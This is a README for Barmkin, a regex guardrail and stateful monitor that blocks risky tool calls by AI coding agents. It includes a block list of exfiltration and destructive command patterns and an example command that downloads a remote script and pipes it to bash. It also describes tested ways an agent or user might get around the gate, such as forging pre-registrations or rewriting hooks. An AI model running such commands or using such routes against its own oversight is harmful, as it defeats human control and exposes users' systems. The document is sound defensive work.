# Barmkin

Regex guardrail for AI coding agents. Each tool call goes through `barmkin eval` before executing. If a rule matches, the command is blocked. Otherwise it passes silently.

Runs as a subprocess per invocation. Config is a YAML file of regex rules.

> **Successor fork.** This fork works toward a stateful barmkin successor. The legacy CLI (`barmkin eval`, installed by `install.sh`) is unchanged and works as described below. The [monitor](#monitor-core-barmkin-monitor) and the [Claude Code shim and managed gate](#claude-code-shim-and-managed-gate-demo) are a separate demo for a dedicated VM: `barmkin eval` does not use them, and `install.sh` does not set them up.

## Scope

Barmkin matches command strings. It does not read file contents or inspect command output. If you need semantic evaluation of what an agent writes or retrieves, use sondera, which adds Cedar policies and LLM classification on top.

## Why the name?

A barmkin is a Scottish defensive wall around a tower house. My friend Sam, who is very Scottish, tells me his ancestors built these to keep my ancestors out. I'm choosing to read that as a compliment about our taste in architecture, our shared desire to try deep-fried battered Mars bars, and our mutual appreciation of Buckfast.

Had this been a network service, it would have listened on port 1707. Sam will know why. I do like Sam.

## Install

```bash
go build -o barmkin .
sudo ./install.sh
```

This puts the binary in `~/.local/bin/`, the config in `/etc/barmkin/rules.yaml`, and registers hooks for both Claude Code and opencode.

### Claude Code

A PreToolUse hook in `~/.claude/settings.json` runs `barmkin eval` on every `Bash`, `Write`, `Edit`, `MultiEdit`, and `NotebookEdit` call. Exit 2 blocks and stderr goes to the LLM.

### opencode

The plugin at `plugins/barmkin.ts` spawns `barmkin eval` on every `tool.execute.before` event. Installed to `~/.config/opencode/plugins/`.

## Commands

```
barmkin eval       stdin in, exit 0 or exit 2
barmkin gate       managed Claude Code shim-presence check, exit 0 or exit 2
barmkin monitor    run the monitor service (see "Monitor core" below)
barmkin test       run deny/allow test vectors
barmkin validate   check config, rules, examples
barmkin stats      aggregate from log file
barmkin version
```

## Rules

45 rules across 9 categories. Every rule has an `example` field that `go test` verifies automatically. Adding a rule with an example adds a test.

| Category | Rules |
|----------|-------|
| Destructive | rm-rf, chmod 777, fork bomb, shutdown, kill -9 -1, shred, mkfs, dd, wipefs, redirect to device |
| Git | reset --hard, push --force, clean -fd, filter-branch |
| Database | TRUNCATE TABLE, DROP TABLE, DROP DATABASE, DELETE without WHERE |
| Exfiltration | curl\|bash, wget\|bash, scp ssh keys, curl upload, tar\|ssh, nc pipe, rsync remote |
| Supply chain | npm git+ install, pip untrusted URL |
| Obfuscation | base64+exec, eval hex |
| Secrets | AWS keys, private keys, GitHub/Slack/GitLab tokens, .env files |
| Persistence | authorized_keys, chown system, ssh tunnel, history clear |
| Container | docker prune --all, docker rm all, kubectl delete namespace |

## Adding rules

Edit `/etc/barmkin/rules.yaml`:

```yaml
- name: "my-rule"
  pattern: 'dangerous\s+command'
  secret: false                       # true: redact this rule's matches from the log
  action: "deny"                      # or "allow" to exempt the deny matches it covers
  reason: "Why it's blocked"
  example: "dangerous command --flag"  # must match, verified by tests
```

Run `barmkin validate` after editing.

### Allow rules

Setting `action: "allow"` on a rule exempts the deny matches that lie inside one of its own matches, regardless of ordering. Use this to exempt specific patterns:

```yaml
- name: "allow-tmp-rm"
  pattern: 'rm\s+-rf\s+/tmp/'
  action: "allow"

- name: "rm-rf-force"
  pattern: 'rm\s+-rf\b'
```

`rm -rf /tmp/build` passes. `rm -rf /home` does not.

An allow rule covers only the text it matches, not the whole command. `rm -rf /tmp/build; rm -rf ~` is still denied by the `rm -rf ~` part, and `rm -rf /tmp/x && curl http://example.com/p.sh | bash` is still denied by `curl-pipe-bash`. A deny match that only overlaps an allow match, rather than lying inside it, is also still denied. Earlier versions let any allow match clear every deny rule for the whole command. Configurations without allow rules behave as before.

## opencode env vars

| Variable | Default | Description |
|----------|---------|-------------|
| `BARMKIN_BIN` | `barmkin` | Binary path |
| `BARMKIN_TITLE` | `Barmkin` | Toast title (if toasts on) |
| `BARMKIN_TOAST` | `0` | `1` enables toast notifications |
| `BARMKIN_DRY_RUN` | `0` | `1` logs denials without blocking |
| `BARMKIN_OFF` | `0` | `1` disables the plugin |

## Logging

Each evaluation appends a JSON line to `~/.barmkin/barmkin.log`:

```json
{"ts":"2026-06-30T01:00:00Z","trajectory_id":"sess-123","tool":"bash","action":"ShellCommand","decision":"deny","reason":"Recursive force-delete","duration_ms":0.064,"rule":"rm-rf-force","content":"rm -rf /tmp","agent":"claude-code"}
```

`content` holds the first 80 characters of the command. Matches of any rule marked `secret: true` (in the bundled rules: AWS access keys, private key blocks, GitHub, Slack and GitLab tokens) are replaced with `[REDACTED:<rule>]` before the cut, so a blocked secret never reaches the log. `barmkin stats` aggregates. The format matches sondera's AuditEntry if you want to query both together.

## OpenTelemetry

Set `otel.endpoint` in rules.yaml to send one span per evaluation to an OTLP collector:

```yaml
otel:
  endpoint: "localhost:4317"
  service: "barmkin"
```

## Monitor core (`barmkin monitor`)

`barmkin monitor` is the successor's monitor service (`internal/monitor`). It serves the versioned shim-monitor contract in `internal/proto` (HTTP POST of JSON to `/v1/<op>` on a Unix socket) and keeps each session's taint in a crash-safe journal (`internal/journal`). The [Claude Code shim and the managed gate](#claude-code-shim-and-managed-gate-demo) use it. `barmkin eval` and `install.sh` do not.

```
barmkin monitor [-socket /run/barmkin/monitor.sock] [-state-dir /var/lib/barmkin]
                [-client-group barmkin-clients] [-preregister-ttl 10s]
```

**Deployment.** Root installs and manages the monitor, which runs as a dedicated service user, for example under a systemd unit with `User=`, `StateDirectory=` and `RuntimeDirectory=`. Root creates both directories. The monitor refuses to start when:
- it is running as root;
- the state directory is not owned by the service user with mode `0700` or tighter;
- the runtime directory is not owned by the service user with mode `0750` or tighter;
- any directory above either one is writable by someone other than root or the service user;
- a path component is a symlink.

The journal is `0600`. The socket is `0660`, group `barmkin-clients`. The service user and every user whose agents connect must be members of that group. The monitor reads each connection's peer credentials (`SO_PEERCRED`) and drops any connection it cannot identify. A client's uid is part of every session key, so one user cannot see or change another user's sessions.

**Sessions and taint.** Each session belongs to a root lineage, and the lineage holds two legs, untrusted and sensitive. Legs only rise, and the first source to raise a leg stays. There is no clear, rotate or capability operation.
- `register` refuses a host whose sandbox is off or allows every Unix socket (`posture_refused`).
- A new lineage starts clean only for a fresh top-level session. Any other new lineage starts with its untrusted leg raised by `unknown_session`.
- Every operation on an unregistered session fails with `unknown_session`, which clients treat as a deny.
- `decide` follows barmkin-mod's egress postures: the untrusted leg denies the deny classes and warns on the rest, both legs deny everything, and a clean session warns only on destructive classes.
- The core has no classifier. `screen` raises the untrusted leg for the content's source and answers `unavailable`.

**Screen service.** `internal/screen` is the Jev screen service the monitor will use, ported from barmkin-mod's TypeScript screen. The monitor core does not call it yet. It takes a shim's already-redacted classifier windows, the shim's local scores and the content's source. It returns pass, escalate or deny, with the composed scores, a closed reason code, a gap code and the legs the content raises. Jev can only raise a score. Content past the last window, or a multi-window plan with a window Jev did not answer, escalates with a gap. A single-window plan whose call fails is decided on its local scores alone, so clean content passes.
- The Jev endpoint and credential belong to the monitor's own configuration, not a plugin's.
- Each endpoint has a breaker.
- Answers are cached for 24 hours in a bounded cache. Failures are never cached, the cache has no query endpoint, and the shadow screen uses its own namespace.
- Golden tests replay barmkin-mod's TypeScript against recorded mock Jev responses. No test calls Jev.

**Journal.** A leg raise or registration is fsynced before the request is answered. At every start the monitor replays the journal and rewrites it as a compact snapshot. If the last run did not stop cleanly (a crash, `SIGKILL`, a torn tail or a damaged record), every known lineage gets its untrusted leg raised by `monitor_restart`. A damaged journal is moved aside as `journal.damaged-<time>`, and only its valid records are replayed. A private regular journal that cannot be read or is over the size limit is moved aside the same way and every session starts unknown. A symlink, a non-regular file, or a journal with the wrong owner or mode is never moved, and the monitor refuses to start. A deleted journal leaves every session unknown, so it denies until it registers again. If a change cannot be journaled, `health` reports `degraded` and every other operation fails `unavailable`.

## Local monitor (foundation)

`cmd/barmkin-monitor` is the first, smaller local decision service for a future stateful barmkin, kept with its own demo. It is separate from `barmkin eval` and from `barmkin monitor`, which replaced it for the Claude Code shim and gate: nothing else calls it, and the default install does not set it up.

It serves a versioned HTTP/JSON contract on a Unix socket (mode `0600`). Requests carry no tool content: only opaque session and tool-call tokens (`[A-Za-z0-9._-]{1,128}`) and values from closed enums. The typed definitions live in `monitor/api.go`.

| Endpoint | Request | Response |
|----------|---------|----------|
| `POST /v1/decide` | `{"version":1,"session":"s","operation":"routine"\|"protected"}` | `{"version":1,"decision":"allow"\|"deny","reason":"..."}` |
| `POST /v1/taint` | `{"version":1,"session":"s","source":"untrusted-input"}` | `{"version":1,"tainted":true\|false,"reason":"..."}` |
| `POST /v1/register` | `{"version":1,"session":"s","call":"c"}` | `{"version":1,"registered":true\|false,"reason":"..."}` |
| `POST /v1/presence` | `{"version":1,"session":"s","call":"c"}` | `{"version":1,"decision":"allow"\|"deny","reason":"..."}` |

Once a session is tainted, `protected` decisions in that session deny and `routine` ones still allow. There is no way to clear a taint yet; how a human clears one (or rotates to a new epoch) is still an open design choice.

`/v1/register` and `/v1/presence` backed the first Claude Code gate demo. A registration is held in memory only, never journaled, and stays live for 10 seconds (`serve -presence-ttl`). A presence check allows only a live registration and consumes it, so each registration admits one call. An unregistered call denies with `unregistered`, an expired one with `expired`. Presence checks also deny while the monitor is refusing decisions after a journal failure. The monitor holds at most 4096 live registrations.

Failures deny:

- Invalid JSON, unknown or repeated keys, case-variant keys, trailing data, oversized bodies, the wrong method, an unsupported `version`, an unknown `operation` or `source`, and unknown paths all deny with a reason code.
- The client (`monitor.Client`, and the `decide` and `send` subcommands) treats anything other than an HTTP 200 carrying a well-formed v1 allow as a deny. If the monitor is unreachable, the result is `monitor-unavailable`.
- If a taint cannot be journaled, the monitor denies every later decision.

Taints are written to an append-only journal. Each record carries a CRC-32C checksum and is fsynced before the taint is acknowledged, so an acknowledged taint survives a crash or `SIGKILL`. On startup the monitor replays the journal and drops only an unterminated final fragment (an append that was interrupted before it was acknowledged). Any other damage stops the monitor from starting, and every client decision then denies. An exclusive `flock` keeps a second monitor off the same journal.

### Demo

```bash
./scripts/monitor-demo.sh     # or: make monitor-demo
```

The script builds `barmkin-monitor` into a temporary directory and starts it there. It checks clean-session allows, malformed and unknown requests, a taint through `/v1/taint`, a `SIGKILL` of the monitor (all decisions deny while it is down), and a restart in which the journaled taint still denies `protected`. It checks every exit code and reason and exits non-zero on the first surprise. `go test ./cmd/barmkin-monitor` runs the same script.

To drive it by hand:

```bash
go build -o /tmp/barmkin-monitor ./cmd/barmkin-monitor
/tmp/barmkin-monitor serve -socket /tmp/bm.sock -journal /tmp/bm.journal & sleep 1
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 0, allow
/tmp/barmkin-monitor taint  -socket /tmp/bm.sock -session s1                         # exit 0, recorded
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 2, tainted
/tmp/barmkin-monitor send   -socket /tmp/bm.sock -path /v1/decide -body '{"bad":1}'  # exit 2, malformed-request
kill -9 %1; /tmp/barmkin-monitor serve -socket /tmp/bm.sock -journal /tmp/bm.journal & sleep 1
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 2, still tainted
```

## Claude Code shim and managed gate (demo)

A demo of the successor's guard for a managed Claude Code seat, under the full managed lock. Two pieces run in every session, and both talk to `barmkin monitor` over its socket:

- **Shim plugin** (`plugins/claude-code/barmkin-shim`). A hooks module (`hooks/register.ts`) ported from barmkin-mod's. The monitor holds the session's taint; the shim keeps everything that needs content, and sends the monitor only ids, closed values and, for a screen, redacted text windows.
- **Managed gate** (`barmkin gate`). A PreToolUse hook in managed settings, so the user cannot remove it. It asks the monitor whether the shim pre-registered that exact call (`/v1/gate`) and exits 0 only if it did.

A session without the shim, or with a broken one, can therefore run no tools.

### What the shim does

**With the monitor:**
- **Session.** At session start the shim registers the session (`/v1/register`) with the posture it reads from settings: whether tools run in the sandbox, and whether the sandbox opens every Unix socket. The monitor refuses a session that is unsandboxed or opens every socket. A brand-new conversation registers as fresh. A resumed one, or a session the shim first meets mid-conversation, does not, so the monitor starts it tainted (`unknown_session`). A new session id in the same process, as after `/clear`, joins the first session's lineage and keeps its legs.
- **Pre-registration.** On `session.append`, before Claude Code starts a call, the shim pre-registers each `tool_use_id` in the model's response (`/v1/preregister`).
- **Egress.** The shim classifies each egress-capable call into class ids, and the monitor decides on them (`/v1/decide`). The calls are shell commands, web fetches and searches, MCP calls, Monitor WebSockets, persistence-file writes and skill loads. Tainted sessions deny or warn per class, and with both legs up every class is denied (the Rule of Two). The shim writes the deny or warning text.
- **Screen.** The shim redacts untrusted content and cuts it into windows: fetched pages, MCP results, files read from outside the project, peer messages and skill bodies. It sends the windows to the monitor with its local scores (`/v1/screen`) and applies the decision: it withholds the content, warns, or passes it.
- **Legs the shim detects.** A credential path in a call, a credential-shaped value in a result, a skill load, and content that hid invisible characters each raise a leg (`/v1/observe`). A load raises the untrusted leg before it runs, and loads are decided one at a time.

**Locally:**
- secret redaction of tool results, prompts and skill bodies, and the invisible-text scrub;
- the MCP description hardening and the per-server allowlist (the `mcp_server_allowlist` option);
- the skill listing guard;
- the outbound message DLP check;
- the inline skill-shell check at `tool.check`;
- the posture warnings at session start;
- the HUD band and prompt-hint label;
- `/barmkin-status`.

The HUD and the status command read a cache of the legs the monitor last reported, so they never wait on it.

**The taint is sticky.** Legs only rise. No prompt, command, compaction or `/clear` lowers one, and there is no clear command. Only a new session starts clean.

**Failure denies.** Every request has a 1-second deadline. When a request times out, fails, gets an error code or a malformed reply, or reaches a monitor of another contract version, the step it guards is denied with text saying why:
- a guarded call is denied;
- untrusted content is withheld;
- a skill is not loaded;
- a subagent does not spawn;
- a result or MCP tool description whose sensitive leg could not be recorded is withheld;
- a file read whose working directory cannot be read is treated as outside the project, so it is screened.

A pre-registration that fails is left for the gate to deny. The shim never holds the conversation up.

**The monitor core has no screen yet.** The screen service (`internal/screen`) is not wired into `barmkin monitor`. So `/v1/screen` raises the untrusted leg for the content's source and answers `unavailable`, and the shim withholds every piece of untrusted content until it is wired in.

The shim has to be a hooks module. Claude Code 2.1.x runs the managed PreToolUse hook before any plugin hook, and a managed deny is final. So a shim written as a plugin PreToolUse command hook never pre-registers a call in time, and the gate denies every call. Managed `prependPlugins` also skips a plugin that has no hooks module. The live lab below shows both.

### What the gate does

The shim's pre-registration normally lands before the gate starts, but its request can still be in flight. So the gate keeps asking for up to 1.5 seconds while the answer is `unregistered`. Every other answer is final. A pre-registration admits one gate check and lives for the monitor's `-preregister-ttl` (10 seconds by default).

The gate exits 2, writing its reason and verdict to stderr, for any of these:

- `unregistered`: no live pre-registration for the call. It was never made, has expired, or was already used.
- `unknown-session`: the monitor does not know the session, because the shim never registered it or the monitor refused its posture.
- `malformed-request`: the hook input has no well-formed `session_id` or `tool_use_id`, is not JSON, is over 64 MiB, or does not arrive within 1 second. A bad gate flag also gives this reason.
- `malformed-response`: a reply other than a well-formed `GateResponse` with HTTP 200, or an error whose status does not match its code.
- `version-mismatch`: the monitor speaks another contract version.
- `monitor-unavailable`: no socket is configured (`-socket`, or `BARMKIN_MONITOR_SOCKET`), or the monitor is unreachable, answers `unavailable`, or stalls past the 500 ms request timeout.
- `deadline-exceeded`: the gate hits its 3-second hard deadline.

A panic inside the gate also denies, with exit 2.

Claude Code treats a hook timeout, and any exit code other than 0 or 2, as a non-blocking error and runs the tool anyway. So the gate never exits with any other code, and its 3-second deadline sits well inside the 10-second hook timeout in the recipe. `go test` checks the shipped recipe against the deadline, and checks that it keeps the full lock.

The demo packages nothing and changes no host settings. Under the lock, sandboxed Bash commands cannot open the monitor socket. Any other process in the `barmkin-clients` group still can, so the demo does not stop such a process from forging a pre-registration. The shim cannot pin the monitor's uid, which is a known residual of the TypeScript transport.

### Tests and lab fixture

```bash
make shim-test                    # claude plugin validate --strict and claude plugin test
./scripts/claude-gate-demo.sh     # or: make claude-gate-demo
```

The shim's suite runs under `claude plugin test`, against an in-memory monitor (`plugins/claude-code/barmkin-shim/tests/support`). It needs Claude Code 2.1.289 (`npm ci` in `plugins/claude-code` installs it). CI runs it in its own job.

`go test .` runs three more checks:
- `plugins/claude-code/monitor-contract.test.ts` (Node 22.18+), which drives a real `barmkin monitor` with the shim's own client code and holds the in-memory monitor's `decide` to the real one;
- the gate's tests against a real monitor;
- the lab fixture script.

The script builds `barmkin` into a temporary directory and starts `barmkin monitor` there. For each simulated tool call it feeds one PreToolUse input to `barmkin gate`. When the shim is "loaded", the script sends the shim's register and pre-registration requests over the socket with curl, the pre-registration still in flight as the gate starts. It checks every exit code and reason:

- Without the shim, a call is denied.
- With the shim, a call is allowed. The same call replayed, a call the shim never saw, or one from a session it never registered is denied.
- A shim pointed at the wrong socket gets its call denied.
- An expired pre-registration, an unsandboxed session, malformed hook input, a gate with no socket, and a `SIGKILL`ed monitor are all denied.
- After a restart, the session comes back tainted by `monitor_restart`, and pre-registered calls are allowed again.

### Live lab under the full lock

```bash
./scripts/claude-lock-lab.sh     # or: make claude-lock-lab, or BARMKIN_CLAUDE_LAB=1 go test -run TestClaudeLockLab .
```

The script runs about thirty real `claude -p` sessions (Claude Code 2.1.x) against a scripted local model. Each runs in a private mount namespace (bubblewrap) where the recipe's paths exist: the recipe itself at `/etc/claude-code/managed-settings.json`, unchanged, plus `/usr/local/bin/barmkin`, `/opt/barmkin/plugins/claude-code` and `/run/barmkin/monitor.sock`. It writes nothing outside a temporary directory. It needs `claude`, `go`, `node`, `bwrap`, `socat`, `curl`, unprivileged user namespaces and an existing `/etc/claude-code` directory to mount over. If any is missing it exits 77.

It checks, under the full lock:

- The shim registers the session and pre-registers each call; single, parallel and subagent tool calls are allowed.
- A file read from outside the project goes to the monitor's screen and taints the session. A `git push` in the next turn is denied by the shim's egress gate, and so is one in the turn after: the taint holds.
- None of these changes the command that runs: user, project, local and `--settings` PreToolUse hooks that rewrite it; a `--plugin-dir` or `CLAUDE_CODE_PLUGIN_DIRS` mod, or a user-installed plugin, that rewrites it and overturns the gate's re-check at `tool.check`; user settings that redefine the `barmkin-local` marketplace or disable the shim. The user hooks and mods are never loaded.
- A sandboxed command cannot reach the monitor socket to forge a pre-registration.
- A plugin-state file that points the shim at a user-writable copy, and `--safe-mode`, stop the shim loading, so every call is denied.
- With the monitor down, every call is denied, including under `disableAllHooks`, `bypassPermissions` and `--bare`.

It also runs controls without the lock, sandbox kept. There, the same hooks, mods and plugins do change the command that runs, but the sandbox alone still keeps a command off the monitor socket. Without the sandbox, the monitor refuses the session, so no tool runs at all. A shim written as a plugin PreToolUse command hook gets every call denied, with or without the lock.

### Managed-settings recipe for the dedicated demo VM

These steps are for the dedicated demo VM only. Nothing in this repository applies them.

1. Install the sandbox helpers, the binary and the plugin marketplace:

   ```bash
   sudo apt-get install -y bubblewrap socat
   go build -o barmkin .
   sudo install -m 0755 barmkin /usr/local/bin/
   sudo mkdir -p /opt/barmkin/plugins && sudo cp -r plugins/claude-code /opt/barmkin/plugins/
   ```

2. Run the monitor as its own service user, in the deployment [`barmkin monitor`](#monitor-core-barmkin-monitor) requires. The demo user joins the client group:

   ```bash
   sudo groupadd --system barmkin-clients
   sudo useradd --system --no-create-home --gid barmkin-clients barmkin
   sudo usermod -aG barmkin-clients "$USER"     # log in again to take the group
   sudo install -d -o barmkin -g barmkin-clients -m 0750 /run/barmkin
   sudo install -d -o barmkin -g barmkin-clients -m 0700 /var/lib/barmkin
   sudo -u barmkin /usr/local/bin/barmkin monitor
   ```

3. Install [`plugins/claude-code/managed-settings.example.json`](plugins/claude-code/managed-settings.example.json) as `/etc/claude-code/managed-settings.json` (owned by root, mode `0644`). It sets up the full lock:
   - `allowManagedHooksOnly: true`: only managed hooks and managed plugins' hooks modules run. User, project, local and `--settings` hooks, `--plugin-dir` mods and user-installed plugins are not loaded. This also switches off any other settings hooks on the VM.
   - `prependPlugins`: seats `barmkin-shim@barmkin-local` and then `cc-plugin-sec-default@builtin`. Keep the security default listed, by that exact id: leaving it out unseats it.
   - `extraKnownMarketplaces` and `enabledPlugins`: declare the local `barmkin-local` marketplace at `/opt/barmkin/plugins/claude-code` and turn on `barmkin-shim@barmkin-local`, which makes the shim a managed plugin.
   - `sandbox`: `enabled`, `failIfUnavailable` and `allowUnsandboxedCommands: false`, with `bwrapPath` and `socatPath` pinned to `/usr/bin` (only managed settings can set these). Sandboxed commands cannot open the monitor socket. Never set `network.allowAllUnixSockets`: the shim reports it, and the monitor refuses the session.
   - `hooks.PreToolUse`: the gate with matcher `*`, `-socket /run/barmkin/monitor.sock`, and `timeout: 10` (seconds).
   - `env.BARMKIN_MONITOR_SOCKET`: tells the shim where the monitor is.

4. Start `claude` as the demo user and confirm that tool calls run. `/barmkin-status` shows the legs and the monitor's state. To see the deny path, stop the monitor, or set `enabledPlugins."barmkin-shim@barmkin-local"` to `false` in the managed settings. Every tool call is then denied with the reason from the gate. Turning the shim off in user settings does not work: the managed setting wins.

The lock holds against the demo user's own settings, mods and plugins. It does not hold against root, who can rewrite the managed settings.

`claude plugin validate plugins/claude-code` checks the marketplace and plugin manifests.
